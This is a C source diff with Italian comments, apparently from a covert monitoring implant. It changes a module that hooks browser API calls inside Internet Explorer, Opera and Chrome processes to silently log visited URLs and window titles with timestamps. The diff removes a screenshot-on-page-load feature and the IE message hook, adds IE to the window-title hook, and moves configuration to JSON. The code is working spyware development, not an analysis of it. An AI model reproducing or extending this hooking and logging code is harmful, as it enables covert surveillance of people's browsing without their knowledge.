@@ -6,7 +6,6 @@
 #define MAXURLLEN 1024
 #define MAXURLTITLELEN 256
 BOOL bPM_UrlLogStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
-BOOL g_capture_screen = FALSE;  // Indica se deve prendere uno snapshot di ogni pagina
 WCHAR last_url[MAXURLLEN+1];
 WCHAR last_window_title[MAXURLTITLELEN+1];
 LPFNOBJECTFROMLRESULT pfObjectFromLresult = NULL;
@@ -24,7 +23,6 @@ typedef struct {
 #define BROWSER_CHROME		 0x00000005
 #define BROWSER_TYPE_MASK    0x3FFFFFFF
 #define BROWSER_SETTITLE     0x80000000
-#define BROWSER_PAGECOMPLETE 0x40000000
 	DWORD browser_type;
 } SendMessageURLStruct;
 SendMessageURLStruct SendMessageURLData;
@@ -98,55 +96,6 @@ DWORD PM_SendMessageURL_setup(HMServiceStruct *pData)
 }
 
 
-LRESULT __stdcall PM_PostMessageURL(HWND hWnd,
-								    UINT Msg,
-								    WPARAM wParam,
-								    LPARAM lParam)
-{
-	BOOL *Active;
-
-	MARK_HOOK
-	INIT_WRAPPER(SendMessageURLStruct)
-	CALL_ORIGINAL_API(4)
-
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_URLLOG);
-	// Controlla se il monitor e' attivo e se la funzione e' andata a buon fine
-	if (!Active || !(*Active) || !ret_code)
-		return ret_code;
-
-	// Per lo snapshot su iexplorer
-	if ( pData->pIsWindow(hWnd) && (Msg==(WM_APP+150) || (Msg==(WM_USER+109) && (wParam==0x0E || wParam==0x0F))))
-		pData->pHM_IpcCliWrite(PM_URLLOG, (BYTE *)&hWnd, 4, pData->browser_type | BROWSER_PAGECOMPLETE, IPC_DEF_PRIORITY);
-			
-	return ret_code;
-}
-
-DWORD PM_PostMessageURL_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-	HMODULE h_usr;
-
-	// Verifica autonomamente se si tratta del processo ie
-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++;
-		if (stricmp(proc_name, "iexplore.exe"))
-			return 1; // Hooka solo internet explorer
-	} else
-		return 1;
-	SendMessageURLData.browser_type = BROWSER_IE;
-
-	VALIDPTR(h_usr = LoadLibrary("User32.dll"));
-	VALIDPTR(SendMessageURLData.pIsWindow = (IsWindow_t)HM_SafeGetProcAddress(h_usr, "IsWindow"));
-	SendMessageURLData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	SendMessageURLData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	SendMessageURLData.dwHookLen = 800;
-	return 0;
-}
-
 BOOL __stdcall PM_SetWindowText(HWND hWnd,
 								BYTE *text)
 {
@@ -179,7 +128,7 @@ DWORD PM_SetWindowText_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++;
-		if (stricmp(proc_name, "opera.exe") && stricmp(proc_name, "chrome.exe"))
+		if (stricmp(proc_name, "opera.exe") && stricmp(proc_name, "chrome.exe") && stricmp(proc_name, "iexplore.exe"))
 			return 1; // Hooka solo opera
 	} else
 		return 1;
@@ -188,6 +137,8 @@ DWORD PM_SetWindowText_setup(HMServiceStruct *pData)
 		SendMessageURLData.browser_type = BROWSER_OPERA;
 	else if (!stricmp(proc_name, "chrome.exe"))
 		SendMessageURLData.browser_type = BROWSER_CHROME;
+	else if (!stricmp(proc_name, "iexplore.exe"))
+		SendMessageURLData.browser_type = BROWSER_IE;
 	else
 		SendMessageURLData.browser_type = BROWSER_UNKNOWN;
 
@@ -215,41 +166,32 @@ void WriteLogURL(WCHAR *url, UrlLogParamsStruct *pUrlLogParams, BOOL check_url)
 
 	_snwprintf_s(url_info->url_name, MAXURLLEN, _TRUNCATE, L"%s", url);
 
-	if ( pUrlLogParams->reason & BROWSER_PAGECOMPLETE ) {
-		// Fa la cattura della finestra solo se il parametro e' attivo e la finestra
-		// del browser si trova ancora in foreground
-		// (evitiamo cosi' anche i doppioni, perche' WM_APP+150 arriva anche alle
-		// altre istanze del browser IE8)
-		if (g_capture_screen && GetForegroundWindow() == pUrlLogParams->browser_window) 
-			TakeSnapShot(pUrlLogParams->browser_window, TRUE, PM_URLAGENT_SNAP, url_info);	
-	} else {
-		if (!wcsncmp(last_url, url, MAXURLLEN) && !wcsncmp(last_window_title, pUrlLogParams->title, MAXURLTITLELEN))
+	if (!wcsncmp(last_url, url, MAXURLLEN) && !wcsncmp(last_window_title, pUrlLogParams->title, MAXURLTITLELEN))
+		return;
+
+	// In opera viene triggerato piu' volte. Se il titolo e' uguale o l'url e' uguale, allora e' una
+	// transizione di pagina
+	if (pUrlLogParams->browser_type == BROWSER_OPERA) {
+		if (!wcsncmp(last_url, url, MAXURLLEN) || !wcsncmp(last_window_title, pUrlLogParams->title, MAXURLTITLELEN))
 			return;
-
-		// In opera viene triggerato piu' volte. Se il titolo e' uguale o l'url e' uguale, allora e' una
-		// transizione di pagina
-		if (pUrlLogParams->browser_type == BROWSER_OPERA) {
-			if (!wcsncmp(last_url, url, MAXURLLEN) || !wcsncmp(last_window_title, pUrlLogParams->title, MAXURLTITLELEN))
-				return;
-		}
-
-		_snwprintf_s(last_url, MAXURLLEN, _TRUNCATE, L"%s", url);
-		_snwprintf_s(last_window_title, MAXURLTITLELEN, _TRUNCATE, L"%s", pUrlLogParams->title);
-
-		// Costruisce e scrive il log sequenziale
-		bin_buf tolog;
-		struct tm tstamp;
-		DWORD delimiter = ELEM_DELIMITER;
-		DWORD log_ver = URL_LOG_VER;
-		GET_TIME(tstamp);
-		tolog.add(&tstamp, sizeof(tstamp));
-		tolog.add(&log_ver, sizeof(DWORD));
-		tolog.add(url_info->url_name, (wcslen(url_info->url_name)+1)*sizeof(WCHAR));
-		tolog.add(&(pUrlLogParams->browser_type), sizeof(DWORD));
-		tolog.add(pUrlLogParams->title, (wcslen(pUrlLogParams->title)+1)*sizeof(WCHAR));
-		tolog.add(&delimiter, sizeof(DWORD));
-		LOG_ReportLog(PM_URLLOG, tolog.get_buf(), tolog.get_len());
 	}
+
+	_snwprintf_s(last_url, MAXURLLEN, _TRUNCATE, L"%s", url);
+	_snwprintf_s(last_window_title, MAXURLTITLELEN, _TRUNCATE, L"%s", pUrlLogParams->title);
+
+	// Costruisce e scrive il log sequenziale
+	bin_buf tolog;
+	struct tm tstamp;
+	DWORD delimiter = ELEM_DELIMITER;
+	DWORD log_ver = URL_LOG_VER;
+	GET_TIME(tstamp);
+	tolog.add(&tstamp, sizeof(tstamp));
+	tolog.add(&log_ver, sizeof(DWORD));
+	tolog.add(url_info->url_name, (wcslen(url_info->url_name)+1)*sizeof(WCHAR));
+	tolog.add(&(pUrlLogParams->browser_type), sizeof(DWORD));
+	tolog.add(pUrlLogParams->title, (wcslen(pUrlLogParams->title)+1)*sizeof(WCHAR));
+	tolog.add(&delimiter, sizeof(DWORD));
+	LOG_ReportLog(PM_URLLOG, tolog.get_buf(), tolog.get_len());
 }
 
 BOOL isURL(WCHAR *url)
@@ -494,18 +436,8 @@ DWORD __stdcall PM_UrlLogStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_UrlLogInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_UrlLogInit(JSONObject elem)
 {
-	url_conf *url_conf_ptr = (url_conf *)conf_ptr;
-	if (url_conf_ptr) {
-		// Tag che indica la nuova configurazione dell'url
-		if (url_conf_ptr->tag == 0xDEADBEEF)
-			g_capture_screen = url_conf_ptr->capture_screen;
-	} else {
-		g_capture_screen = FALSE;
-	}
-
-	PM_UrlLogStartStop(bStartFlag, TRUE);
 	ZeroMemory(last_url, sizeof(last_url));
 	ZeroMemory(last_window_title, sizeof(last_window_title));
 	return 1;
@@ -514,10 +446,5 @@ DWORD __stdcall PM_UrlLogInit(BYTE *conf_ptr, BOOL bStartFlag)
 
 void PM_UrlLogRegister()
 {
-	// L'hook viene registrato dalla funzione HM_InbundleHooks
-	AM_MonitorRegister(PM_URLLOG, (BYTE *)PM_UrlLogDispatch, (BYTE *)PM_UrlLogStartStop, (BYTE *)PM_UrlLogInit, NULL);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_UrlLogInit(NULL, FALSE);
+	AM_MonitorRegister(L"url", PM_URLLOG, (BYTE *)PM_UrlLogDispatch, (BYTE *)PM_UrlLogStartStop, (BYTE *)PM_UrlLogInit, NULL);
 }
